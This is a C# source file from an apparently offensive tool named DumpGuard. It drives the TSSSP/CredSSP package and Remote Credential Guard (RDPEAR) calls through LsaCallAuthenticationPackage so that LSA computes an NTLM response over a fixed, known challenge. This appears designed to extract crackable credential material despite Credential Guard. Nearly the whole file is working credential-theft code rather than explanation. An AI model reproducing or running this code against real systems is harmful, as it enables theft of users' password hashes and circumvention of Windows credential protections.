using DumpGuard.Tsssp;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using static DumpGuard.Ntlm.NtlmTypes;
using static DumpGuard.Tsssp.TssspTypes;

namespace DumpGuard
{
    public enum CREDSSP_SUBMIT_TYPE : uint
    {
        CredsspPasswordCreds = 2,
        CredsspSchannelCreds = 4,
        CredsspCertificateCreds = 13,
        CredsspSubmitBufferBoth = 50,
        CredsspSubmitBufferBothOld = 51,
        CredsspCredEx = 100,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CREDSSP_CRED
    {
        public CREDSSP_SUBMIT_TYPE Type;
        public IntPtr pSchannelCred;
        public IntPtr pSpnegoCred;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CREDSSP_CRED_EX
    {
        public CREDSSP_SUBMIT_TYPE Type;
        public uint Version;
        public uint Flags;
        public uint Reserved;
        public CREDSSP_CRED Cred;
    }

    internal class Credssp
    {
        public const uint CREDSSP_CRED_EX_VERSION = 0;
        public const uint CREDSSP_FLAG_REDIRECT = 1;
    }

    internal class TssspClient : IDisposable
    {
        private SEC_HANDLE Credential;
        private SEC_HANDLE Context;

        private TssspServer Server { get; set; }

        public TssspClient(TssspServer server)
        {
            Credential = new SEC_HANDLE();
            Context = new SEC_HANDLE();

            Server = server;
        }

        public void Dispose()
        {
            if (Context.LowPart != IntPtr.Zero || Context.HighPart != IntPtr.Zero)
            {
                Interop.DeleteSecurityContext(ref Context);
                Context.Reset();
            }

            if (Credential.LowPart != IntPtr.Zero || Credential.HighPart != IntPtr.Zero)
            {
                Interop.FreeCredentialsHandle(ref Credential);
                Credential.Reset();
            }
        }

        public bool AcquireCredentialHandle()
        {
            var credsspex = new CREDSSP_CRED_EX
            {
                Type = CREDSSP_SUBMIT_TYPE.CredsspCredEx,
                Version = Credssp.CREDSSP_CRED_EX_VERSION,
                Flags = Credssp.CREDSSP_FLAG_REDIRECT
            };

            credsspex.Cred.Type = CREDSSP_SUBMIT_TYPE.CredsspSubmitBufferBoth;

            const uint SECPKG_CRED_OUTBOUND = 2;

            return Interop.AcquireCredentialsHandle(null, "TSSSP", SECPKG_CRED_OUTBOUND, IntPtr.Zero,
                credsspex.ToRawBytes(), IntPtr.Zero, IntPtr.Zero, ref Credential, out SEC_INT expiry) >= 0;
        }

        public bool InitializeSecurityContext(string Target, SecBufferDescWrapper Input, ref SecBufferDescWrapper Output)
        {
            const uint ISC_REQ_ALLOCATE_MEMORY = 0x100;
            const uint SECURITY_NATIVE_DREP = 0x10;

            var native_input = Input.GetNativeBuffer();
            var native_output = Output.GetNativeBuffer();

            int result = 0;

            if (Context.LowPart == IntPtr.Zero && Context.HighPart == IntPtr.Zero)
            {
                result = Interop.InitializeSecurityContext(ref Credential, IntPtr.Zero, Target, ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP,
                    IntPtr.Zero, 0, out Context, ref native_output, out uint context_attributes, out SEC_INT expiry);
            }
            else
            {
                result = Interop.InitializeSecurityContext(ref Credential, ref Context, Target, ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP,
                    ref native_input, 0, out Context, ref native_output, out uint context_attributes, out SEC_INT expiry);
            }

            Output.SetNativeBuffer(native_output);

            const uint SEC_E_OK = 0;
            const uint SEC_I_CONTINUE_NEEDED = 0x90312;

            if (result == SEC_E_OK)
                return true;
            if (result == SEC_I_CONTINUE_NEEDED)
                return false;
            else
                throw new Exception($"InitializeSecurityContext failed with HRESULT: {result:x}");
        }

        public bool CallPackageLayer1(byte[] input, out byte[] output)
        {
            output = null;

            var ntlm_cred_header = input.ToStruct<MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL_HEADER>();

            if (ntlm_cred_header.Version != MSV1_0_CRED_VERSION.REMOTE)
                throw new Exception("NTLM supplemental credential is not inteded for remote credential redirection");

            var ntlm_cred_buffer = input.Skip(Marshal.SizeOf<MSV1_0_REMOTE_SUPPLEMENTAL_CREDENTIAL_HEADER>()).ToArray();
            var ntlm_cred_buffer_handle = GCHandle.Alloc(ntlm_cred_buffer, GCHandleType.Pinned);

            var nt_challenge = new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
            var nt_challenge_handle = GCHandle.Alloc(nt_challenge, GCHandleType.Pinned);

            var remote_secrets = new MSV1_0_REMOTE_ENCRYPTED_SECRETS(ntlm_cred_header, ntlm_cred_buffer_handle.AddrOfPinnedObject());
            var remote_secrets_ptr = Marshal.AllocHGlobal(Marshal.SizeOf<MSV1_0_REMOTE_ENCRYPTED_SECRETS>());

            try
            {
                Marshal.StructureToPtr(remote_secrets, remote_secrets_ptr, false);

                var input_params = new NtlmCredIsoRemoteInput_CalculateNtResponse();
                input_params.CallId = RemoteGuardCallId.RemoteCallNtlmCalculateNtResponse;
                input_params.NtChallenge = nt_challenge_handle.AddrOfPinnedObject();
                input_params.Credential = remote_secrets_ptr;

                if (Interop.NtlmEncodeCredIsoRemoteInput(ref input_params, out var encoded_ptr, out var encoded_size))
                {
                    var encoded_header = new NtlmCredIsoRemoteHeader(0x1234);
                    var encoded_header_bytes = encoded_header.ToRawBytes();

                    var encoded_params = new byte[encoded_header_bytes.Length + encoded_size];
                    Array.Copy(encoded_header_bytes, encoded_params, encoded_header_bytes.Length);
                    Marshal.Copy(encoded_ptr, encoded_params, encoded_header_bytes.Length, encoded_size);

                    if (CallPackageLayer2(encoded_params, out byte[] response))
                    {
                        var decoded_header = response.ToStruct<NtlmCredIsoRemoteHeader>();

                        if (decoded_header.AlwaysOne == 1 && decoded_header.Sequence == 0x1234)
                        {
                            var decoded_params = response.Skip(Marshal.SizeOf<NtlmCredIsoRemoteHeader>()).ToArray();

                            if (Interop.NtlmDecodeCredIsoRemoteOutput(decoded_params, decoded_params.Length, out var output_params_ptr))
                            {
                                var output_params = Marshal.PtrToStructure<NtlmCredIsoRemoteOutput_CalculateNtResponse>(output_params_ptr);

                                if (output_params.CallId == RemoteGuardCallId.RemoteCallNtlmCalculateNtResponse && output_params.Status == 0)
                                {
                                    output = output_params.NtResponse.Data;
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
            finally
            {
                Marshal.FreeHGlobal(remote_secrets_ptr);
                nt_challenge_handle.Free();
                ntlm_cred_buffer_handle.Free();
            }

            return false;
        }

        public bool CallPackageLayer2(byte[] input, out byte[] output)
        {
            output = null;

            using (var TsRemoteGuardInnerPacket = new TSRemoteGuardInnerPacket("NTLM", input))
            {
                var TsRemoteGuardInnerPacketEncoded = Interop.EncodeObject(TsRemoteGuardInnerPacket, TS_ASN1_PDU.TsRemoteGuardInnerPacket);
                var TsRemoteGuardInnerPacketEncrypted = Server.Encrypt(TsRemoteGuardInnerPacketEncoded);

                if (CallPackageLayer3(TsRemoteGuardInnerPacketEncrypted, out byte[] response))
                {
                    var TsRemoteGuardResponseDecrypted = Server.Decrypt(response);

                    using (var TsRemoteGuardResponseDecodedWrapper = Interop.DecodeObject<TSRemoteGuardInnerPacket>(TsRemoteGuardResponseDecrypted, TS_ASN1_PDU.TsRemoteGuardInnerPacket))
                    {
                        output = TsRemoteGuardResponseDecodedWrapper.Object.Buffer.ToBytes();
                        return true;
                    }
                }
            }

            return false;
        }

        public bool CallPackageLayer3(byte[] input, out byte[] output)
        {
            output = null;

            var rdpear_payload_header = new RDPEAR_PAYLOAD_HEADER(input.Length, Context.HighPart);
            var rdpear_payload = rdpear_payload_header.ToRawBytes().Concat(input).ToArray();

            if (CallPackageLayer4(rdpear_payload, out byte[] response))
            {
                var rdpear_response_header = response.ToStruct<RDPEAR_PAYLOAD_HEADER>();
                var rdpear_response_buffer = response.Skip(Marshal.SizeOf<RDPEAR_PAYLOAD_HEADER>()).Take(rdpear_response_header.Length).ToArray();

                if (rdpear_response_header.IsCorrectMagic())
                {
                    output = rdpear_response_buffer;
                    return true;
                }
            }

            return false;
        }

        public bool CallPackageLayer4(byte[] input, out byte[] output)
        {
            output = null;

            var result = false;

            if (Interop.LsaConnectUntrusted(out IntPtr LsaHandle) >= 0)
            {
                var PackageName = new LSA_STRING("TSSSP");

                if (Interop.LsaLookupAuthenticationPackage(LsaHandle, ref PackageName, out uint AuthenticationPackage) >= 0)
                {
                    if (Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, input, input.Length, out var ReturnBuffer, out var ReturnBufferSize, out var ProtocolStatus) >= 0)
                    {
                        output = new byte[ReturnBufferSize];
                        Marshal.Copy(ReturnBuffer, output, 0, ReturnBufferSize);

                        result = true;

                        Interop.LsaFreeReturnBuffer(ReturnBuffer);
                    }
                }

                PackageName.Dispose();
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }

            return result;
        }
    }
}
